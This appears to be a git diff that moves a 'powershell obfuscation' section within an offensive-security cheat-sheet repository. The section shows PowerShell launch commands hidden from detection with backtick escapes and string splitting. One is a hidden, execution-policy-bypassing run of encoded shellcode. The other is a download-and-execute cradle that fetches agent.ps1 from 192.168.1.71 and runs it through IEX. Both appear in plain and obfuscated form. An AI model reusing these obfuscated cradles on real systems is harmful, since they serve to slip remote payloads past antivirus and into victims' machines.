@@ -46,6 +46,31 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
 <br /><br /><br />
 
+## powershell obfuscation
+
+- string command to obfuscate<br />
+`powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
+The above string can be obfuscated using the **powershell escape caracter** `<br />
+
+- string obfuscated<br />
+
+      po`w`er`shel`l.ex`e -n`op -w`i`nd h`idd`en -Ex`e`c B`yp`a`ss -no`n`i -en`c $shellcode
+
+---
+
+- string command to obfuscate<br />
+`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
+The above string can be obfuscated using **powershell escape caracters** ` and + <br />
+
+- string obfuscated<br />
+
+      $get = New-Object "N`et`Web`Cl`ie`nt"
+      p`owe`r`she`l`l.exe `IE`X ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')
+
+---
+
+<br /><br /><br />
+
 ## bash obfuscation
 
 - encoding shellcode from **C** to **ANCII**
@@ -132,30 +157,6 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
 ---
 
-<br /><br /><br />
-
-## powershell obfuscation
-
-- string command to obfuscate<br />
-`powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
-The above string can be obfuscated using the **powershell escape caracter** `<br />
-
-- string obfuscated<br />
-
-      po`w`er`shel`l.ex`e -n`op -w`i`nd h`idd`en -Ex`e`c B`yp`a`ss -no`n`i -en`c $shellcode
-
----
-
-- string command to obfuscate<br />
-`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
-The above string can be obfuscated using **powershell escape caracters** ` and + <br />
-
-- string obfuscated<br />
-
-      $get = New-Object "N`et`Web`Cl`ie`nt"
-      p`owe`r`she`l`l.exe `IE`X ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')
-
----
 
 <br /><br /><br />
 
